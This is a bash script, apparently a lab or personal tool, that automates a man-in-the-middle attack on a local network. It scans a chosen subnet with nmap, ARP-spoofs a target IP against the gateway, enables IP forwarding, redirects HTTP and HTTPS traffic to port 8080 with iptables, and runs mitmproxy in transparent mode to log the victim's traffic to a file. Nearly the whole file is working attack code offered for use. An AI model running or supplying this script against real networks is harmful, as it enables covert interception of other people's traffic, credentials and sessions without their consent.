#!/bin/bash

# Host machine IP and MAC address info
echo
echo Your IP address is: 
ip addr show eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1

echo 
echo Your MAC address is:

ip addr show eth0 | grep "link/ether\b" | awk '{print $2}' | cut -d/ -f1 

echo
echo Your Gateway address is:

ip route | grep default | awk '{print $3}'

echo
echo =========================================================================================

# Nmap scanning for all active hosts in the local network
echo
echo "Please provide an IP address and prefix that you would like to scan (Nmap Scan):"
echo "  Example format: 192.168.1.1/24"
echo

read IP_address

nmap -A $IP_address

echo
echo =========================================================================================

# Select Target IP address and Gateway address to start ARP spoofing
echo
echo "To begin ARP Spoofing, please provide the TARGET IP and GATEWAY IP addresses"
echo

read -p "TARGET IP: " Target

read -p "GATEWAY IP: " Gateway

echo
echo "You have selected" $Target "as the TARGET IP and" $Gateway "as the GATEWAY IP"
echo
read -p  "Would you like to begin ARP Spoofing with the provdied IP address? (Y/N): " Y

gnome-terminal -- ./arpspoof.sh
# arpspoof.sh is a sepearte executeable file with the command: arpspoof -i eth0 -t (Target IP) (Gateway IP) 

echo 
echo =========================================================================================

#Begin the MitMProxy
echo
echo "IMPORTANT: To begin capturing the Targets network traffic, make sure to keep the second terminal open for continuous ARP spoofing." 
echo
read -p "Would you like to start running your proxy? (Y/N): " Y

sysctl -w net.ipv4.ip_forward=1

sysctl -w net.ipv6.conf.all.forwarding=1

sysctl -w net.ipv4.conf.all.send_redirects=0

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080

ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Firewall rules must first be set in order for the attacking machine to allow for traffic to flow uninterupted
# These same rules can be configured within the linux system to be set permenantely.

mitmproxy --mode transparent --showhost >> /root/tollbooth/mitmproxy_log

